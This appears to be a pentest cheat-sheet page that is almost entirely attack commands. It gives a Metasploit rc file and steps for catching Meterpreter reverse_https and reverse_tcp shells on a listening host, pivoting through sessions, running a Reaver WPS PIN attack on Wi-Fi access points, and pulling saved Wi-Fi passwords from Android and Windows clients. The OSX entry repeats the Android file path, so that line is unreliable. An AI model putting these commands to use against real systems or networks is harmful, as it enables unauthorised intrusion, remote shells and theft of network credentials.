---
title: Metasploit
category: Exploitation
order: 2
---

> **Useage** 

Example rc file | <code> use exploit/multi/handler <br> set PAYLOAD windows/meterpreter/reverse_https <br> set LHOST 10.10.75.1 <br> set LPORT 8443 <br> set ExitOnSession false <br> exploit -j </code>
Run an rc file | <code> Resource <location of RC file> </code>
location | <code> /opt/metasploit-4.11/ or /usr/share/framework2/ </code>
Exploit Location | <code> <location>/apps/pro/msf3/modules/exploits/ </code>
Payload Location | <code> <location>/apps/pro/msf3/modules/payloads </code>
run | <code> ./app/msfconssole </code>
Show Exploits | <code> show exploits </code>
Find Exploits | <code> search multi/handler or search android </code>
Info about Exploits | <code> info exploit/multi/handler </code>
Use Exploit | <code> use exploit/multi/handler </code>
Show Payloads | <code> show payloads </code>
Set Payload | <code> set PAYLOAD windows/shell/reverse_tcp </code>
Show Options on Payload | <code> show options </code>
Set Remote Hosts | <code> set RHOST 10.10.77.1 </code>
Set Local Hosts | <code> set LHOST 10.10.75.1 </code>
Exit on Session | <code> set ExitOnSession false </code>
Exploit as Job | <code> exploit -j </code>
list running jobs | <code> Jobs </code>
List sessions | <code> sessions -l </code>
Interact with session | <code> session -i [n] </code>
Background a shell | <code> CTRL-Z </code>
Kill sessions  | <code> sessions -K </code>
Add a route | <code> route add [victim2 subnet] [netmask] [sid] </code> 
Errno:ECONNECT RESET | Reason: Windows Antivirus on client


> **WPS** 

The following need to be installed:<br>
* [Reaver](https://code.google.com/p/reaver-wps/)

{% highlight bash %}
#Search for WPS that is enabled and not locked
$ sudo wash -i wlan0mon -C

#Once located start the attack
$ sudo reaver -i wlan0mon 00:00:00:00:00:00 -S -v

#If reaver keeps tring 12345670:
$ sudo reaver -i wlan0mon -b 00:24:B2:88:CC:65 -S -v -N
{% endhighlight %}


> **Client Keys** 

Android:
{% highlight bash %}
$ cat /data/misc/wifi/wpa_supplicant.conf | grep psk=
{% endhighlight %}

OSX:
{% highlight bash %}
# Requires User Access
$ cat /data/misc/wifi/wpa_supplicant.conf | grep psk=
{% endhighlight %}

Windows:
{% highlight powershell %}
netsh wlan show profiles
{% endhighlight %}
* http://www.nirsoft.net/utils/wireless_key.html



